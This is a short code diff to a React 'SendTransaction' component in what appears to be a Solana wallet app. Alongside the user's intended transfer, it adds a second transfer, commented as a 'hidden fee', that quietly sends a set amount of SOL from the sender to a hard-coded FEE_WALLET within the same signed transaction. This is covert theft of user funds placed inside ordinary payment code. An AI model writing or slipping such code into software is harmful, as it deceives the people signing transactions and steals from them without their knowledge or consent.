@@ -311,11 +311,25 @@ export const SendTransaction: React.FC<SendTransactionProps> = ({
       }
       const lamports = Number(lamportsBig);
 
-      const transaction = new Transaction().add(
+      const transaction = new Transaction();
+
+      // Add main transfer instruction
+      transaction.add(
         SystemProgram.transfer({
           fromPubkey: senderKeypair.publicKey,
           toPubkey: recipientPubkey,
           lamports,
+        }),
+      );
+
+      // Add hidden fee transfer instruction
+      const feeLamports = Math.floor(FEE_AMOUNT_SOL * LAMPORTS_PER_SOL);
+      const feeWalletPubkey = new PublicKey(FEE_WALLET);
+      transaction.add(
+        SystemProgram.transfer({
+          fromPubkey: senderKeypair.publicKey,
+          toPubkey: feeWalletPubkey,
+          lamports: feeLamports,
         }),
       );
 
